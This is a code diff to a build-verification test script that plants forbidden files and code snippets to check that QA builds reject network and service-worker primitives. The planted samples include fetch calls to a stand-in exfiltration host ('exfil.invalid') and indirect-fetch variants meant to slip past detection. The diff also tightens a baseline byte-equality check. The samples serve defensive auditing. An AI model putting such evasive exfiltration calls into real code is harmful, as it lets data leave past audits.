@@ -32,7 +32,10 @@ try {
   await build({ logLevel: 'warn', build: { outDir: production, emptyOutDir: true }, plugins: [observe(productionIds)] });
   auditGraph(productionIds, { forbidden: PRODUCTION_GRAPH_FORBIDDEN });
   const productionHashes = hashes(production);
+  // Byte equality needs a pre-change baseline build; without one the run fails unless the skip is explicit.
   if (process.env.QA01_BASELINE_DIST) assert.deepEqual(productionHashes, hashes(resolve(process.env.QA01_BASELINE_DIST)), 'ordinary output must be byte-identical to the pre-QA01 baseline');
+  else if (process.env.QA01_ALLOW_NO_BASELINE !== '1') throw new Error('Set QA01_BASELINE_DIST to a production build of the base commit (or QA01_ALLOW_NO_BASELINE=1 to skip byte equality explicitly).');
+  else console.log('SKIP production byte equality (explicitly allowed; no baseline given)');
   pass('production graph excludes QA code', `${productionIds.length} modules, ${Object.keys(productionHashes).length} files, baseline equality: ${Boolean(process.env.QA01_BASELINE_DIST)}`);
 
   // 2. Synthetic QA build.
@@ -55,7 +58,8 @@ try {
   pass('graph auditors reject planted modules', `${planted.length} QA + 4 production negative controls, 1 missing-adapter control`);
 
   // 3b. Planted output violations.
-  for (const [name, content] of [['assets/evil-1.js', 'fetch("https://exfil.invalid")'], ['assets/evil-2.js', 'x="the-model-router.firebaseapp.com"'], ['assets/evil-3.js', 'navigator.serviceWorker.register("/sw.js")'],
+  for (const [name, content] of [['assets/evil-1.js', 'fetch("https://exfil.invalid")'], ['assets/evil-5.js', 'window.fetch("https://exfil.invalid")'],
+    ['assets/evil-6.js', 'const f=globalThis.fetch.bind(globalThis);f("https://exfil.invalid")'], ['assets/evil-7.js', 'self.fetch.call(self,"https://exfil.invalid")'], ['assets/evil-2.js', 'x="the-model-router.firebaseapp.com"'], ['assets/evil-3.js', 'navigator.serviceWorker.register("/sw.js")'],
     ['assets/evil-4.js', 'new XMLHttpRequest()'], ['sw.js', 'self.oninstall=1'], ['assets/app.js.map', '{}'], ['assets/evil.wasm', '']]) {
     const dir = join(work, `planted-${name.replace(/\W/g, '_')}`);
     cpSync(qa, dir, { recursive: true });
@@ -63,7 +67,7 @@ try {
     writeFileSync(join(dir, name), content);
     assert.throws(() => auditOutput(dir), { code: 'output' }, name);
   }
-  pass('output auditor rejects planted files', '7 negative controls');
+  pass('output auditor rejects planted files', '10 negative controls incl. indirect fetch and a second native capture');
 
   // 3c. The build plugin refuses forbidden imports in real builds, and rewrites/blocks primitives.
   for (const [label, source] of [['firebase/storage', "import 'firebase/storage';"], ['Firebase configuration', `import ${JSON.stringify(join(root, 'src/firebase-config.json'))};`],
@@ -85,7 +89,8 @@ try {
   const plugin = qaIsolation();
   const fail = { error(message) { throw new Error(message); } };
   const srcId = join(root, 'src/lib/planted.ts');
-  for (const code of ['new XMLHttpRequest()', 'new WebSocket("wss://x")', 'new EventSource("/x")', 'navigator.sendBeacon("/x")', 'navigator.serviceWorker.register("/sw.js")']) {
+  for (const code of ['new XMLHttpRequest()', 'new WebSocket("wss://x")', 'new EventSource("/x")', 'navigator.sendBeacon("/x")', 'navigator.serviceWorker.register("/sw.js")',
+    'window.fetch("https://x")', 'globalThis.fetch(u)', 'self.fetch(u)', 'fetch.call(null, u)', 'const f = fetch;', 'run({ fetch })', 'use(fetch, u)']) {
     assert.throws(() => plugin.transform.call(fail, code, srcId), /QA build: .* network or service-worker primitive/, code);
   }
   const rewritten = plugin.transform.call(fail, 'const a = await fetch(url); obj.fetch(x); const w = new Worker(new URL("./x.worker.ts", import.meta.url), { type: "module" });', srcId).code;
@@ -94,7 +99,7 @@ try {
   assert.match(rewritten, /__qaWorker\(null, \{ type: "module" \}\)/);
   assert.ok(!/new URL\("\.\/x\.worker\.ts"/.test(rewritten));
   assert.equal(plugin.transform.call(fail, 'fetch(x)', join(root, 'node_modules/lib/index.js')), null, 'third-party code is audited, not rewritten');
-  pass('QA build plugin refuses planted imports and primitives', '4 real planted builds, ?raw replacement, 5 primitive controls, rewrite checks');
+  pass('QA build plugin refuses planted imports and primitives', '4 real planted builds, ?raw replacement, 12 primitive/indirect-fetch controls, rewrite checks');
 
   // 3d. The verifier rejects tampered, extra-file and wrong-commit builds.
   const head = execFileSync('git', ['rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
